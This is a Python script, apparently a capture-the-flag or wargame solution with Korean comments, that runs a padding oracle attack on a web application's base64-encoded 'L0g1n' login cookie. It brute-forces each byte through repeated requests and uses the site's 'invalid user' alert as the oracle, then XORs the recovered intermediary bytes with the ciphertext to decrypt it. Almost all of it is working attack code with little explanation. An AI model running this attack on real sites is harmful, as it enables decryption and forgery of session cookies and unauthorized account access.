```python
import requests, base64
```

```python
def hexToInt(_hex):
    return int('0x'+_hex, 16)
```

```python
def makeSuffix(arr, n):
    result=""
    for _hex in arr:
        temp = hex(hexToInt(_hex)^n)[2:]
        if len(temp)!=2:
            temp="0"+temp
        result+=temp
    return result
```

```python
I=[]
for round in range(1, 8+1):
    val_prefix = '00'*(8-round)
    print("i", I)
    val_suffix=makeSuffix(I, round)
    print(f"val_suffix : {val_suffix}")

    result_no=-1
    for i in range(0x00,0xFF+1):  # 00부터 FF까지 반복
        hex_val = f"{val_prefix}{i:02X}{val_suffix}"  # 16진수 값을 생성
        
        hex_bytes = bytes.fromhex(hex_val)  # 16진수를 바이트로 변환
        base64_encoded = base64.b64encode(hex_bytes).decode()  # Base64로 인코딩
        
        cookies = {'L0g1n': base64_encoded + cookie2}  # 쿠키에 인코딩된 값을 설정
        
        response = requests.get(url, cookies=cookies)  # 요청을 보내고 응답을 받음

        print(f"{round}|{i} : {hex_val}")
        text = '<script>alert("invalid user.");window.location.href=\'./index.php\';</script>'
        if response.text.strip() == text:  # 응답이 공백이 아닌 경우
            print(response.text.strip())  # 16진수 값과 응답 텍스트를 반환
            print("="*10)
            result_no=i
            break
    
    print(f"result_no : {result_no}")
    if result_no==-1:
        print(f"error at {round}|{i}")
        break

    result_hex=hex(result_no^round)[2:]
    if len(result_hex)==1:
        result_hex="0"+result_hex
    print(f"result_hex : {result_hex}")
    I = [result_hex] + I
print("".join(I))
```

```python
def decodeCiphertext(ciphertext, intermediary):
    # ciphertext : base64로 인코딩됨
    # intermediary : hex
    decoded_bytes = base64.b64decode(ciphertext)
    result_hex_bytes = bytes.fromhex(intermediary)

    decoded_bytes = bytes([b ^ x for b, x in zip(decoded_bytes, result_hex_bytes)])

    # UTF-8로 디코딩 (일반적으로 텍스트일 경우 사용)
    try:
        decoded_str = decoded_bytes.decode("utf-8")
        print(decoded_str)
        return decoded_str
    except UnicodeDecodeError:
        print("해당 값은 UTF-8로 변환할 수 없습니다. 바이트 값:", decoded_bytes)
```
